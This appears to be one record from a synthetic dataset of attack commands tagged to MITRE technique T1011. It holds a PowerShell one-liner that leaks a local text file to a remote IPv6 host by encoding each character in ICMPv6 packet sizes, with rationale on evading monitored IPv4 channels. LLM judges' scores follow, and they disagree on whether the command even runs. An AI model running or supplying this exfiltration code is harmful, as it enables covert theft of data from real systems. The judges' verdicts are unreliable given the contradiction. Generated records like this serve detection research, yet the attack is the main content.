@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\\Users\\Public\\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }",
+  "explanation": "Frames text exfiltration over ICMPv6 by sending a start-of-line marker payload size followed by per-character payload sizes, using ICMPv6 as the alternate medium per T1011.",
+  "rationale_steps": [
+    "Iterate lines, emitting a fixed-size sync marker for each line.",
+    "Encode each character into the ICMP payload size with a known base.",
+    "Use IPv6 addressing to avoid commonly monitored IPv4 channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-2dc0b3c8",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quotes and separators, but Test-Connection mixes -ComputerName with -IPv6, a parameter combination unsupported in any PowerShell version, causing parameter-binding errors.",
+        "semantic_score": 3,
+        "semantic_justification": "It conceptually automates exfiltration by encoding text into ICMPv6 payload sizes, but the invalid Test-Connection parameters prevent execution as written and the ULA IPv6 target may be unreachable, reducing operational feasibility.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:40:00.742291Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct method calls, and appropriate pipeline operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by reading a text file and encoding its contents in ICMPv6 packet buffer sizes, using Test-Connection to transmit data to an IPv6 address, which aligns perfectly with the T1011 technique of exfiltration over an alternative protocol.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:40:03.947925Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid PowerShell syntax, balanced constructs, and correctly used parameters for cmdlets and methods.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely executes the claimed text exfiltration over ICMPv6 by encoding data into packet sizes, aligning perfectly with T1011's automated exfiltration via an alternative protocol.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T02:40:18.572425Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
